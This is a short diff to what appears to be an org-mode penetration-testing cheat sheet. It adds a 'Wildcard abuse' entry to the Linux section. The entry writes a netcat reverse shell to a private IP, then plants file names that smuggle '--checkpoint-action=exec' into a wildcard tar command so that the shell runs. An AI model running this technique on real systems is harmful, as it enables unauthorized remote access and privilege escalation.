@@ -627,7 +627,13 @@ find / -name "*GENERIC*" -ls
    #+begin_example
 env
    #+end_example
-   
+Wildcard abuse
+ #+begin_example
+echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+tar cf archive.tar *
+#+end_example
 ** Windows
 *** Basic enumeration
     operating system, version and architecture
